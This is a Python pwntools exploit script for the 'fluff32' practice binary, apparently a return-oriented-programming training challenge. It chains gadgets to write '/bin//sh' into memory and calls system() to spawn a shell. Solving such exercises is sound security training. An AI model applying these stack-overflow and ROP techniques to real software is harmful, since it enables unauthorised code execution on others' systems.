#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def write_mem(address, string):
    # load address to edx
    chain =  p32(0x08048671)     # xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
    chain += p32(0xcafebabe)     # junk
    chain += p32(0x080483e1)     # pop ebx; ret
    chain += p32(address)
    chain += p32(0x0804867b)     # xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret
    chain += p32(0xcafebabe)     # junk

    # edx <---> ecx (now ecx points to the address)
    chain += p32(0x08048689)     # xchg edx,ecx; pop ebp; mov edx,0xdefaced0; ret
    chain += p32(0xcafebabe)     # junk

    # load string to edx
    chain += p32(0x08048671)     # xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
    chain += p32(0xcafebabe)     # junk
    chain += p32(0x080483e1)     # pop ebx; ret
    chain += string
    chain += p32(0x0804867b)     # xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret
    chain += p32(0xcafebabe)     # junk

    # write string in memory
    chain += p32(0x08048693)     # mov [ecx],edx; pop ebp; pop ebx; xor [ecx],bl; ret
    chain += p32(0xcafebabe)     # junk
    chain += p32(0xcafebabe)     # junk
    chain += p32(0x08048697)     # xor [ecx],bl; ret
    return chain

def exploit():
    p = process('./fluff32')
    binary = ELF("fluff32", checksec=False)
    address = 0x0804a0c8  # address to start write to
    systemPLT = binary.symbols["system"]

    # create payload
    payload = 44*"A"
    payload += write_mem(address,  '/bin') # write '/bin' into memory
    payload += write_mem(address+4,'//sh') # write '//sh' into memory + 4
    payload += p32(systemPLT)              # system@PLT
    payload += p32(0xcafebabe)             # junk
    payload += p32(address)                # address --> '/bin/sh'

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF